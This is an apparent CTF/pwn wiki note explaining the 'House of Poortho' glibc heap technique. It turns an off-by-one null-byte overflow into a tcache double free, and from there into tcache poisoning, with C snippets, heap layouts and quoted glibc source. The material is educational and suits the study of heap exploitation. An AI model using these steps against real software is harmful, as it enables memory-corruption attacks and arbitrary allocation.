---
tags:
  - pwn
  - pwn/technique
  - pwn/heap
---
# Description
The **House of Poortho** is a technique that leverages an [[off-by-one]] overflow on a buffer on the heap (most commonly a *null byte* overflow) to cause a [[double free]].

TL;DR:
1. We allocate two adjacent chunks
2. We free the second chunk
3. We use the off-by-one overflow on the first chunk to change the size of the second chunk
4. We free the second chunk again, bypassing the tcache double free check introduced in glibc 2.29 since the second chunk is in a different tcache bin.

As of glibc 2.42, it does not appear to have been mitigated.
# Attack
Note that these are written with glibc 2.29 in mind. In versions newer than 2.31, a heap leak is also required to decrypt safe linking.
## Requirements
- [[off-by-one]] overflow
- ability to try freeing an address twice
## Results
- [[double free]] / [[tcache poisoning]]
## Process
### Parameters/Constraints
- Chunk `a` size: `sz_a`, must be tcache sized and have a least significant nibble of `0x8` (to enable the off-by-one overflow)
- Chunk `b` size: `sz_b`, must be tcache sized and is the desired tcache poisoning size.\* The off-by-one overflow must also be able to change the size of chunk `b`, i.e. if you are limited to a null byte overflow then the actual\*\* size of chunk `b` must be at least `0x110` and cannot end with `0x00`.
\**Technically, the actual size of chunk `b` after overflowing can also be the desired tcache poisoning size. But it is simpler this way.*
\*\**By actual size, I mean the chunk size written in the chunk header.*
- Target pointer for allocation, `target`
### Steps
This analysis will assume that we have a *null byte* overflow and:
- `sz_a = 0x28`
- `sz_b = 0x100` (the actual size will be `0x110`)

1. Allocate chunks `a` and `b`
	```c
	intptr_t a = malloc(0x28);
	intptr_t b = malloc(0x100);
	```
2. Free `b`
	```c
	free(b);
	```
	Which results in the following heap structure:
	```
	a:  0x0    0x41
	    0x0    0x0
		0x0    0x0
	b:  0x0    0x111
		next   key
	```
	Where next is `0x0` (provided tcache starts empty) and key points to the `tcache_perthread_struct`.
3. Use the off-by-one overflow on chunk `a` to overflow into the header of chunk `b`, shrinking chunk `b`
	```c
	memset(a, 0, 0x28 + 1);
	```
	That is,
	```
	b:  0x0    0x100
	```
4. Free `b` again
	```c
	free(b);
	```
	Since `b` now has a size of `0x100`, according to its chunk header, it will be freed into a different tcache bin. Notably, the [double free check](https://elixir.bootlin.com/glibc/glibc-2.29/source/malloc/malloc.c#L4197) introduced in glibc 2.29 does *not* check for this:
	```c
		/* This test succeeds on double free.  However, we don't 100%
	   trust it (it also matches random payload data at a 1 in
	   2^<size_t> chance), so verify it's not an unlikely
	   coincidence before aborting.  */
	if (__glibc_unlikely (e->key == tcache))
	  {
	    tcache_entry *tmp;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx];
		 tmp;
		 tmp = tmp->next)
	      if (tmp == e)
		malloc_printerr ("free(): double free detected in tcache 2");
	    /* If we get here, it was a coincidence.  We've wasted a
	       few cycles, but don't abort.  */
	  }
	```
	As you'll notice, when it realizes the "key" field of chunk `b` still points to the `tcache_perthread_struct`, it checks if the freed chunk already exists in the relevant tcache bin. However, since chunk `b` was freed to two different tcache bins, this check passes, giving us a double free!
5. From here, we can simply poison tcache. For instance, the following code will allocate a chunk of size `0x110` at `target`.
	```c
	intptr_t b_uaf = malloc(0x100); // reallocate the chunk that was just freed
	b_uaf[0] = target;
	intptr_t poison = malloc(0x110);
	printf("%x", poison - 0x10); // should output the target allocation address!
	```
# References
1. https://redpwn.net/writeups/picoctf2019/zero_to_hero/ (credit to @jespiron from redpwn for telling me about this house :D)
2. https://elixir.bootlin.com/glibc/glibc-2.29/source/malloc/malloc.c